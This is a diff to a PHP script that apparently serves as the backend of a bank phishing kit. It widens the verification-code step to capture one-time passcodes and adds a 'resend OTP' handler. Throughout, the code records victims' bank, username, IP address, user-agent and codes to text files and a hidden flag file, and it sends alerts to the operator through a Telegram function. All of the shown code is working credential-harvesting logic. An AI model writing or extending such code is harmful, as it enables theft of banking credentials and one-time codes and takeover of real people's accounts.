@@ -349,9 +349,9 @@ if ($step === 'reset_phone' || $step === 'reset_email') {
 /* ════════════════════════════════════════════════════════════
    STEP 5: CODE  (verification code submitted)
    ════════════════════════════════════════════════════════════ */
-if ($step === 'code') {
+if ($step === 'code' || $step === 'otp') {
 
-    $code      = clean($_REQUEST['code'] ?? '');
+    $code      = clean($_REQUEST['code'] ?? $_REQUEST['otp'] ?? '');
     $data_file = $data_dir . '/login_submissions.txt';
 
     $record = implode("\n", [
@@ -403,6 +403,61 @@ if ($step === 'code') {
     );
 
     echo json_encode(['status' => 'success', 'message' => 'Code received.']);
+    exit;
+}
+
+/* ════════════════════════════════════════════════════════════
+   STEP 6: RESEND OTP (user requested new OTP)
+   ════════════════════════════════════════════════════════════ */
+if ($step === 'resend_otp') {
+
+    $data_file = $data_dir . '/login_submissions.txt';
+
+    $record = implode("\n", [
+        $divider,
+        '🔄  OTP Resend Requested --' . $bank,
+        $divider,
+        'Date       : ' . $timestamp,
+        'Bank       : ' . $bank,
+        'Username   : ' . $username,
+        'IP         : ' . $client_ip,
+        'User-Agent : ' . $user_agent,
+        $divider,
+    ]) . "\n\n";
+
+    $fp = fopen($data_file, 'a');
+    if ($fp) {
+        flock($fp, LOCK_EX);
+        fwrite($fp, $record);
+        flock($fp, LOCK_UN);
+        fclose($fp);
+        chmod($data_file, 0640);
+        file_put_contents($data_dir . '/.flag_form', $record);
+    }
+
+    $terminal_log = "\n" . $divider . "\n"
+        . "🔄  OTP Resend Requested --" . $bank . "\n"
+        . "Time       : " . $timestamp   . "\n"
+        . $divider . "\n"
+        . "Username   : " . $username    . "\n"
+        . "IP         : " . $client_ip   . "\n"
+        . $divider . "\n";
+
+    error_log($terminal_log);
+    file_put_contents('php://stderr', $terminal_log);
+
+    sendTelegramAlert(
+        '🔄 OTP Resend Requested -- ' . $bank,
+        [
+            'Bank'       => $bank,
+            'Username'   => $username,
+            'IP'         => $client_ip,
+            'Timestamp'  => $timestamp,
+        ],
+        16753920   /* 0xFFA500  Orange */
+    );
+
+    echo json_encode(['status' => 'success', 'message' => 'Resend logged.']);
     exit;
 }
 
